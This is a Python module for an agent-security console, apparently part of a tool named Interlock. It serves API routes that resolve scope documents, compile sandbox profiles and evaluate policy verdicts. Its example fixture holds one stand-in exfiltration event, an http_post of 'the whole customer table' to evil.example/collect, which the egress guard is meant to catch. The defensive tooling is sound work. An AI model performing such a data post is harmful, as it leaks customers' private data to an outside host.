"""The scopes and sandbox inspector: resolve a scope document for one
principal, show the sandbox profile BRACE would compile for it, and
optionally the playground verdict for one event under that scope - behind
``POST /api/scopes/resolve``, ``GET /api/scopes/example`` and
``GET /api/sandbox``.

A request builds a fresh ``ScopeTree``/``ScopeRegistry`` from the client's
document; nothing is kept between requests. Resolving a scope only ever calls
``ScopeRegistry.resolve`` and ``interlock.brace.compile_profile`` /
``select_backend().wrap`` - the last of which is documented as side-effect
free - so answering a request never calls ``subprocess``, ``os.fork``,
``os.exec*`` or ``Sandbox.run``: it computes a plan, it never starts one.

Rule templates (``{"detector", "factory", "union_params"}``) are validated the
same way :mod:`interlock.console.playground` validates a rule - same catalog
lookup, same ``inspect.signature(...).bind(...)`` check, same error codes -
reusing its private helpers rather than a second copy of that logic.
Containment-only templates (``{"containment": true}``) add no rule; BRACE
reads their resolved params by template id instead.
"""
from __future__ import annotations

import copy
import importlib
import inspect
import json
from dataclasses import dataclass
from typing import Any, Callable, Dict, FrozenSet, List, Optional, Tuple

from ..brace import KNOWN_TOKENS, available_backends, compile_profile, select_backend
from ..brace.profile import SandboxProfile
from ..policy.engine import PolicyEngine, Rule
from ..policy.scopes import (
    Binding,
    DelegationDepthExceeded,
    DelegationOverGrant,
    SCOPE_BACKEND,
    ScopeRegistry,
    ScopeTree,
    Template,
    UnknownTemplate,
)
from .playground import PlaygroundError, _detector_by_module, _factory_by_name, _parse_event, _result_for
from .server import ROUTES

#: More scope paths or templates than this cannot come from a person pasting
#: a document into the inspector; refused outright rather than accepted and
#: left to degrade resolution performance (F15).
MAX_SCOPE_PATHS = 64
MAX_TEMPLATES = 32

#: More segments than this is not a principal, it is a mistake (F16).
MAX_PRINCIPAL_SEGMENTS = 16

_DOCUMENT_KEYS = frozenset({"templates", "bindings"})
_RULE_TEMPLATE_KEYS = frozenset({"detector", "factory", "union_params"})
_CONTAINMENT_TEMPLATE_KEYS = frozenset({"containment", "union_params"})
_BINDING_KEYS = frozenset({"template_id", "params", "enabled", "delegated_from"})


def _never_called(**_kwargs: Any) -> Rule:
    # A containment-only template's Template.factory is required by the
    # dataclass but unused: resolve_scope builds the PolicyEngine's rules
    # straight from the resolved rule templates, never through
    # ScopeRegistry.compile()/for_scope(), so this must never run.
    raise AssertionError("containment-only template has no rule factory")


@dataclass
class _TemplateDef:
    kind: str  # "rule" or "containment"
    union_params: FrozenSet[str]
    fn: Optional[Callable[..., Rule]] = None


def _split_scope_path(raw: str) -> Tuple[str, ...]:
    return tuple(part for part in raw.split("/") if part)


def _parse_principal(raw: Any) -> Tuple[str, ...]:
    if not isinstance(raw, str):
        raise PlaygroundError("bad_principal", "principal must be a string")
    segments = tuple(raw.split("/"))
    if not segments or any(seg == "" for seg in segments) or len(segments) > MAX_PRINCIPAL_SEGMENTS:
        raise PlaygroundError(
            "bad_principal",
            "principal must be 1 to {} non-empty segments joined by '/'".format(
                MAX_PRINCIPAL_SEGMENTS
            ),
        )
    return segments


def _parse_union_params(spec: Dict[str, Any], template_id: str) -> FrozenSet[str]:
    raw = spec.get("union_params", [])
    if raw is None:
        raw = []
    if not isinstance(raw, list) or not all(isinstance(p, str) for p in raw):
        raise PlaygroundError(
            "bad_document", "template {!r}: union_params must be a list of strings".format(template_id)
        )
    return frozenset(raw)


def _parse_template(template_id: Any, spec: Any) -> _TemplateDef:
    if not isinstance(template_id, str) or not isinstance(spec, dict):
        raise PlaygroundError("bad_document", "template {!r} must be an object".format(template_id))

    if spec.get("containment") is True:
        if set(spec) - _CONTAINMENT_TEMPLATE_KEYS:
            raise PlaygroundError(
                "bad_document",
                "template {!r} has a key outside the containment template shape".format(template_id),
            )
        return _TemplateDef(kind="containment", union_params=_parse_union_params(spec, template_id))

    if set(spec) - _RULE_TEMPLATE_KEYS or "detector" not in spec or "factory" not in spec:
        raise PlaygroundError(
            "bad_document", "template {!r} is not a valid rule or containment template".format(template_id)
        )

    detector = _detector_by_module(spec.get("detector"))
    if detector is None:
        raise PlaygroundError(
            "unknown_detector", "no such detector module: {!r}".format(spec.get("detector"))
        )
    factory_name = spec.get("factory")
    if _factory_by_name(detector, factory_name) is None:
        raise PlaygroundError(
            "unknown_factory", "{} has no rule factory {!r}".format(detector["module"], factory_name)
        )
    # detector/factory are only ever compared against the catalog's own list
    # above - never imported before that check passes (the same discipline
    # playground.py's _build_rule follows).
    module = importlib.import_module("interlock.detectors." + detector["module"])
    fn = getattr(module, factory_name)
    return _TemplateDef(kind="rule", union_params=_parse_union_params(spec, template_id), fn=fn)


def _parse_binding(scope_path: str, index: int, spec: Any) -> Binding:
    if not isinstance(spec, dict):
        raise PlaygroundError(
            "bad_document", "binding {} at {!r} must be an object".format(index, scope_path)
        )
    if set(spec) - _BINDING_KEYS or "template_id" not in spec:
        raise PlaygroundError(
            "bad_document", "binding {} at {!r} is not a valid binding".format(index, scope_path)
        )

    template_id = spec["template_id"]
    if not isinstance(template_id, str):
        raise PlaygroundError(
            "bad_document",
            "binding {} at {!r}: template_id must be a string".format(index, scope_path),
        )

    params = spec.get("params", {})
    if params is None:
        params = {}
    if not isinstance(params, dict):
        raise PlaygroundError(
            "bad_document", "binding {} at {!r}: params must be an object".format(index, scope_path)
        )

    enabled = spec.get("enabled", True)
    if not isinstance(enabled, bool):
        raise PlaygroundError(
            "bad_document", "binding {} at {!r}: enabled must be a boolean".format(index, scope_path)
        )

    delegated_from_raw = spec.get("delegated_from")
    if delegated_from_raw is None:
        delegated_from: Optional[Tuple[str, ...]] = None
    elif isinstance(delegated_from_raw, str):
        delegated_from = _split_scope_path(delegated_from_raw)
    else:
        raise PlaygroundError(
            "bad_document",
            "binding {} at {!r}: delegated_from must be a string or null".format(index, scope_path),
        )

    return Binding(template_id=template_id, params=params, enabled=enabled, delegated_from=delegated_from)


def _parse_document(document: Any) -> Tuple[Dict[str, _TemplateDef], Dict[Tuple[str, ...], List[Binding]]]:
    if not isinstance(document, dict) or (set(document) - _DOCUMENT_KEYS):
        raise PlaygroundError(
            "bad_document", "document must be an object with only 'templates' and 'bindings'"
        )

    templates_raw = document.get("templates", {})
    bindings_raw = document.get("bindings", {})
    if not isinstance(templates_raw, dict):
        raise PlaygroundError("bad_document", "templates must be an object")
    if not isinstance(bindings_raw, dict):
        raise PlaygroundError("bad_document", "bindings must be an object")
    if len(templates_raw) > MAX_TEMPLATES:
        raise PlaygroundError("bad_document", "at most {} templates are allowed".format(MAX_TEMPLATES))
    if len(bindings_raw) > MAX_SCOPE_PATHS:
        raise PlaygroundError(
            "bad_document", "at most {} scope paths are allowed".format(MAX_SCOPE_PATHS)
        )

    templates = {
        template_id: _parse_template(template_id, spec) for template_id, spec in templates_raw.items()
    }

    bindings: Dict[Tuple[str, ...], List[Binding]] = {}
    for scope_path, specs in bindings_raw.items():
        if not isinstance(specs, list):
            raise PlaygroundError("bad_document", "bindings for {!r} must be a list".format(scope_path))
        bindings[_split_scope_path(scope_path)] = [
            _parse_binding(scope_path, index, spec) for index, spec in enumerate(specs)
        ]

    return templates, bindings


def _encode_resolved(resolved: Dict[str, Dict[str, Any]]) -> Dict[str, Dict[str, Any]]:
    return {
        template_id: {
            key: sorted(value) if isinstance(value, (set, frozenset)) else value
            for key, value in params.items()
        }
        for template_id, params in resolved.items()
    }


def _encode_profile(profile: SandboxProfile) -> Dict[str, Any]:
    return {
        "read_paths": list(profile.read_paths),
        "write_paths": list(profile.write_paths),
        "allow_network": profile.allow_network,
        "allowed_hosts": sorted(profile.allowed_hosts),
        "env_keys": sorted(profile.env.keys()),
        "cpu_seconds": profile.cpu_seconds,
        "memory_mb": profile.memory_mb,
        "unshare_pid": profile.unshare_pid,
        "workdir": profile.workdir,
    }


def _compute_sandbox(resolved_raw: Dict[str, Dict[str, Any]]) -> Dict[str, Any]:
    profile = compile_profile(resolved_raw)
    backend = select_backend()
    # wrap() is documented side-effect free: it builds the plan, it never
    # execs anything (see the module docstring's never-spawn invariant).
    plan = backend.wrap(profile, ["/usr/bin/true"])
    enforced = sorted(plan.enforced)
    not_enforced = sorted(set(KNOWN_TOKENS) - set(enforced))
    return {
        "profile": _encode_profile(profile),
        "backend": backend.name,
        "enforced": enforced,
        "not_enforced": not_enforced,
        "available_backends": available_backends(),
    }


def _build_rule(template_id: str, meta: _TemplateDef, params: Dict[str, Any]) -> Rule:
    try:
        inspect.signature(meta.fn).bind(**params)
    except TypeError as exc:
        raise PlaygroundError("bad_kwargs", str(exc))
    try:
        return meta.fn(**params)
    except Exception as exc:
        raise PlaygroundError("factory_failed", type(exc).__name__)


def resolve_scope(document: Any, principal: Any, event: Any) -> Dict[str, Any]:
    """The full ``POST /api/scopes/resolve`` body for this document/principal/event.

    Raises :class:`~interlock.console.playground.PlaygroundError` for every
    documented error code (F15-F20, plus unknown_detector/unknown_factory/
    bad_kwargs/factory_failed/bad_event reused from the playground).
    """
    scope = _parse_principal(principal)
    templates, bindings = _parse_document(document)

    tree = ScopeTree()
    for path, binding_list in bindings.items():
        tree.bind(path, binding_list)

    registry_templates = {
        template_id: Template(
            template_id=template_id,
            factory=(meta.fn if meta.kind == "rule" else _never_called),
            union_params=meta.union_params,
        )
        for template_id, meta in templates.items()
    }
    registry = ScopeRegistry(tree, registry_templates)

    try:
        resolved_raw = registry.resolve(scope)
    except UnknownTemplate as exc:
        raise PlaygroundError("unknown_template", str(exc))
    except DelegationDepthExceeded as exc:
        raise PlaygroundError("delegation_depth_exceeded", str(exc))
    except DelegationOverGrant as exc:
        raise PlaygroundError("delegation_over_grant", str(exc))

    sandbox = _compute_sandbox(resolved_raw)

    # Built unconditionally: bad_kwargs/factory_failed are refused the same
    # way whether or not an event was given, the same as unknown_template or
    # a delegation error above - only the verdict itself waits for an event.
    rules = [
        _build_rule(template_id, templates[template_id], params)
        for template_id, params in resolved_raw.items()
        if templates[template_id].kind == "rule"
    ]

    decision = None
    if event is not None:
        sensor_event = _parse_event(event, 0)
        sensor_event.principal = principal
        engine = PolicyEngine(rules=rules)
        decision = _result_for(engine, sensor_event, 0)

    return {
        "scope": list(scope),
        "scope_backend": SCOPE_BACKEND,
        "resolved": _encode_resolved(resolved_raw),
        "sandbox": sandbox,
        "decision": decision,
    }


#: The document, principal and event ``GET /api/scopes/example`` hands back -
#: exactly the example the spec defines (F14), so the UI and the tests share
#: one fixture.
EXAMPLE_DOCUMENT: Dict[str, Any] = {
    "templates": {
        "egress_allowlist": {
            "detector": "data_egress",
            "factory": "network_egress_guard",
            "union_params": ["allowed_hosts"],
        },
        "sandbox_limits": {"containment": True},
    },
    "bindings": {
        "root": [{"template_id": "egress_allowlist", "params": {"allowed_hosts": ["api.internal"]}}],
        "root/acme": [{"template_id": "egress_allowlist", "params": {"allowed_hosts": ["api.acme.com"]}}],
        "root/acme/agent42": [{"template_id": "sandbox_limits", "params": {"cpu_seconds": 5}}],
        "root/globex/bot1": [],
    },
}
EXAMPLE_PRINCIPAL = "root/acme/agent42"
EXAMPLE_EVENT: Dict[str, Any] = {
    "action": "http_post",
    "args": {"url": "https://evil.example/collect", "body": "the whole customer table"},
}


def _read_json_body(handler: Any) -> Any:
    content_type = handler.headers.get("Content-Type", "")
    if content_type.split(";")[0].strip().lower() != "application/json":
        raise PlaygroundError("unsupported_media_type", "Content-Type must be application/json")
    try:
        length = int(handler.headers.get("Content-Length", 0) or 0)
    except ValueError:
        length = 0
    raw = handler.rfile.read(length) if length > 0 else b""
    try:
        body = json.loads(raw.decode("utf-8")) if raw else {}
    except (ValueError, UnicodeDecodeError):
        raise PlaygroundError("bad_request", "body is not valid JSON")
    if not isinstance(body, dict):
        raise PlaygroundError("bad_request", "body must be a JSON object")
    return body


def _handle_scopes_resolve(handler: Any) -> Tuple[int, dict]:
    try:
        body = _read_json_body(handler)
    except PlaygroundError as exc:
        status = 415 if exc.code == "unsupported_media_type" else 400
        return status, exc.body()

    try:
        result = resolve_scope(body.get("document"), body.get("principal"), body.get("event"))
    except PlaygroundError as exc:
        return 400, exc.body()
    return 200, result


def _handle_scopes_example(_handler: Any) -> Tuple[int, dict]:
    return 200, {
        "document": copy.deepcopy(EXAMPLE_DOCUMENT),
        "principal": EXAMPLE_PRINCIPAL,
        "event": copy.deepcopy(EXAMPLE_EVENT),
    }


def _handle_sandbox(_handler: Any) -> Tuple[int, dict]:
    return 200, {
        "available_backends": available_backends(),
        "selected": select_backend().name,
        "known_tokens": sorted(KNOWN_TOKENS),
    }


ROUTES["/api/scopes/resolve"] = {"POST": _handle_scopes_resolve}
ROUTES["/api/scopes/example"] = {"GET": _handle_scopes_example}
ROUTES["/api/sandbox"] = {"GET": _handle_sandbox}
